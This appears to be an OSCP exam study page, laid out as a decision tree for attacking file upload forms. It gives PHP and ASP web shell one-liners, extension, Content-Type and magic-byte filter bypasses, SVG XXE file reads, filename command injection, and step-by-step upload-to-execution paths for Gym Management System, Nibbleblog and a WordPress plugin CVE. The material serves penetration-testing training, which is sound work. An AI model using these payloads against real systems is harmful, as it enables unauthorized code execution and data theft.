# File Upload Attacks, Decision Tree

Part of [[DECISION TREE]]. "I found X, what do I try" for file upload forms.

---

### Found an upload form — what filter is in place?

Work through the bypass ladder in order:

**Step 1: Is there any filter at all?** Upload `shell.php` directly. If it uploads and executes at `/uploads/shell.php`, you're done.

**Step 2: Is the filter client-side only?** Open the upload page in a browser, can you see JavaScript validation in the source? Two bypasses:
- Burp: upload a real image, intercept in Burp, change `filename="shell.php"` and replace image bytes with `<?php system($_REQUEST['cmd']); ?>`
- DevTools: `Ctrl+Shift+C`, modify the form's `onSubmit` to remove the validation call, remove `accept=".jpg,.jpeg,.png"` from the file input

**Step 3: Is it a blacklist?** `.php` blocked but other variants not. Try `.phar` first (most commonly missed). If that fails, fuzz extensions via Burp Intruder (PHP extensions list, disable URL encoding, markers around `.php`, sort by response length).

**Step 4: Is it a whitelist?** Only image extensions allowed. Bypass:
- Double extension `shell.php.jpg` (works if Apache handles `.php` anywhere in the name, a misconfiguration)
- Reverse double extension `shell.phar.jpg` (`.phar` bypasses blacklist, `.jpg` satisfies whitelist end, use when combined blacklist + whitelist)

**Step 5: Is there a Content-Type check?** The server checks the `Content-Type` header. In Burp, change it to `image/gif` or `image/svg+xml`. Fuzz all `image/` types via Intruder if not sure which is accepted.

**Step 6: Is there a MIME type / magic bytes check?** The server calls `mime_content_type()` on the file content. Prepend `GIF8` to the file (4 bytes, marks it as a GIF). Combined payload: `GIF8\n<?php system($_REQUEST['cmd']); ?>`.

→ See [[File Upload Attacks#Filter Bypass Techniques|Command Appendix]], [[09. Common Web Application Attacks|Common Web Application Attacks]]

### Gym Management System 1.0 is identified
→ Use the unauthenticated upload path in [[Windows - Web - Gym Management Upload]]
→ Submit an image/png multipart part named kaio-ken.php.png with id=kamehameha
→ Request upload/kamehameha.php and confirm code execution with whoami
→ See [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]]

### Anonymous FTP writes to an IIS web root
→ Upload a harmless file with `curl --upload-file $BoxDir/www/$File ftp://$BoxIP/$RemoteFile`
→ Request `http://$BoxIP/$RemoteFile` and confirm the returned status and handler
→ Upload the minimum ASP command shell and query it with `curl -sG --data-urlencode "cmd=whoami" http://$BoxIP/$RemoteFile`
→ Continue at [[RUNBOOK V2/Windows - Web - FTP Upload]]
→ See [[OSCP/BOXES/WRITE UPS/Windows/Devel|Devel]]

### Nibbleblog 4.0.3 is identified
→ Authenticate once with the documented account test and save the session cookie
→ Upload PHP through the `my_image` plugin using the multipart fields in [[File Upload Attacks#Nibbleblog 4.0.3 Authenticated Plugin Upload|Command Appendix]]
→ Request `/nibbleblog/content/private/plugins/my_image/image.php` to trigger the renamed file
→ See [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|HTB Nibbles]]

### Upload form accepts only SVG images (or similarly restricted "safe" types)
→ SVG is XML, inject XXE to read arbitrary files: `<!ENTITY xxe SYSTEM "/flag.txt">` → view page source after upload, file contents appear inside `<svg>`
→ Read PHP source via SVG XXE + php://filter: `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php">` → base64-decode the blob in page source → reveals upload directory path and filename convention
→ For RCE: create an SVG+PHP polyglot. SVG XML wrapper + `<?php system($_REQUEST['cmd']); ?>` in the same file. PHP executes the PHP block, ignoring the XML prefix. Use `.phar.svg` extension (`.phar` executes, `.svg` satisfies whitelist ending)
→ If the frontend blocks `.svg` extension: save as `.jpeg`, intercept in Burp, change `filename` and `Content-Type: image/svg+xml` in the intercepted request
→ See [[09. Common Web Application Attacks#9.3.3. Advanced Upload Filter Bypasses|FUA.6]], [[File Upload Attacks#SVG XXE. File Read and PHP Source Disclosure|Command Appendix]]

### You need to find the uploaded file path (it's not disclosed by the app)
→ Try common paths: `/uploads/`, `/profile_images/`, `/img/`, `/files/`, `/media/`
→ If you have LFI: use php://filter to read the upload handler source, look for `$target_dir`
→ If the app has SVG upload: use SVG XXE with php://filter to read the upload handler source
→ If the handler uses `date()` for filename prefix: `date +%y%m%d` gives today's prefix in `YYMMDD` format
→ See [[09. Common Web Application Attacks#9.3.3. Advanced Upload Filter Bypasses|FUA.7]], [[File Upload Attacks#Upload Date-Prefixed Filename Prediction|Command Appendix]]

### Upload form works but nothing you upload ever executes
→ Check whether the `filename` field itself is traversal-able. If so, overwrite something like `authorized_keys` instead of relying on execution
→ See [[09. Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2]]

### An upload passes content/extension filtering fine, but the app does something to the file afterward (resize, rotate, convert, thumbnail, scan)
→ The filename itself may get passed unsanitized into a shell command during that later processing step, not at upload time, check whether shell metacharacters (`;`, `|`, backticks) in the filename survive into that later command
→ The trigger for this class of bug is usually a *second* request (the resize/convert/rotate action itself), not the upload request, a payload can sit dormant until that second step fires
→ Mechanics: [[File Upload Attacks (Breakdowns)#elFinder CVE-2019-9194: shell metacharacter injection via the uploaded filename|Command Breakdowns]]
→ See [[14. Fixing Exploits#Module Exercise VM #2: elFinder web application|Fixing Exploits, Module Exercise VM #2]] (elFinder CVE-2019-9194)

### You're targeting a WordPress site with Simple File List plugin (<= 4.2.2)
→ Two-step unauthenticated RCE: upload a `.png`, then rename it to `.php`
→ Upload needs: `eeSFL_ID=1`, `eeSFL_FileUploadDir`, `eeSFL_Timestamp`, `eeSFL_Token`
→ Rename needs: `eeFileOld=<name>`, `eeListFolder=/`, `eeFileAction=Rename|<name>.php`, and `X-Requested-With: XMLHttpRequest`
→ Include the page’s `eeSecurity` nonce when required; some vulnerable deployments accept the static request without it
→ Always verify the upload by GETting the file URL before attempting rename
→ CVE-2020-36847 / EDB-52371
→ See [[File Upload Attacks#WordPress Plugin Upload — Two-Step via Plugin Engine (CVE-2020-36847)|Command Appendix]], [[WordPress - Simple File List Upload]]
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for shell troubleshooting
- [CyberChef](https://gchq.github.io/CyberChef/) for transformations
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
## Why this matters for OSCP

This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.

## Related Modules

- [[MODULES/09. Common Web Application Attacks]] -- module concepts used by this hub page

## Demonstrated in box write-ups

- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
